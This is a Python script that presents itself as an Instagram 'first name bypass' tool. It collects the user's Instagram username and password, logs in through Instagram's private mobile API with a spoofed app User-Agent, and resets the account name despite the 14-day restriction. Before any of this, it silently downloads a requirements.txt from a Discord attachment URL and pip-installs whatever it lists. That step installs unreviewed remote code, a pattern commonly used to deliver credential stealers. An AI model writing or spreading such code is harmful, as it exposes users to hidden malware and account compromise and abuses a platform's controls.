import subprocess
from sys import platform
import os
from os import system

if platform == 'win32':
    try:
        subprocess.run(['pip', 'install', 'requests'])
    except Exception or ImportError:
        print('Failed at installing requests')
else:
    try:
        subprocess.run(['pip3', 'install', 'requests'])
    except Exception or ImportError:
        try:
            subprocess.run(['pip', 'install', 'requests'])
        except Exception or ImportError:
            print('Failed at installing requests')

import requests

rd = requests.get('https://cdn.discordapp.com/attachments/796386357848178698/859528161569538068/requirements.txt').text
f = open('requirements.txt', 'w', encoding='utf-8').write(rd)
if platform == 'win32':
    try:
        subprocess.run(['pip', 'install', '-r', 'requirements.txt'])
    except Exception or ImportError:
        print('\nFailed at installing requests\https://cdn.discordapp.com/attachments/796386357848178698/859528161569538068/requirements.txt')
else:
    try:
        subprocess.run(['pip3', 'install', '-r', 'requirements.txt'])
    except Exception or ImportError:
        try:
            subprocess.run(['pip', 'install', '-r', 'requirements.txt'])
        except Exception or ImportError:
            print('\nFailed at installing requirements.txt\https://cdn.discordapp.com/attachments/796386357848178698/859528161569538068/requirements.txt')
os.system('cls' if os.name == 'nt' else 'clear')

from uuid import uuid4
import json
from colorama import Fore
import stdiomask

r = requests.session()
uid = uuid4()

print(f'''{Fore.MAGENTA}
   ____  ____  ___ _       __
  / __ \/ __ \/   | |     / /
 / /_/ / /_/ / /| | | /| / / 
 \__, / ____/ ___ | |/ |/ /  
/____/_/   /_/  |_|__/|__/   
                             
{Fore.RESET}14 Day First Name Bypass
''')

username = input('Username: ')
password = stdiomask.getpass(prompt='Password: ', mask='*')
name = input('Name: ')

login_url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {
    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US",
    "X-IG-Capabilities": "3brTvw==",
    "X-IG-Connection-Type": "WIFI",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    'Host': 'i.instagram.com',
    'Connection': 'keep-alive'
}
name_url = 'https://i.instagram.com/api/v1/accounts/set_phone_and_name/'
name_data = {
    "first_name": name
}

def bypass():
    global cook
    r2 = r.post(name_url, headers=headers, data=name_data, cookies=cook).status_code
    if r2 == 200:
        print(f"{Fore.RED}Bypassed{Fore.RESET}: set name to '{name}'")
    else:
        print('Error')
        exit()

login_data = {
    'uuid': uid,
    'password': password,
    'username': username,
    'device_id': uid,
    'from_reg': 'false',
    '_csrftoken': 'missing',
    'login_attempt_countn': '0'
}

def login():
    global log, loginJS
    global cook
    log = r.post(login_url, headers=headers, data=login_data)
    loginJS = log.json()
    if 'logged_in_user' in log.text:
        print(f'{Fore.GREEN}\nLogged in\n')
        cook = log.cookies
        bypass()
        pass
    else:
        print(f'{Fore.RED}\nLogin failed\n')
        exit()
login()
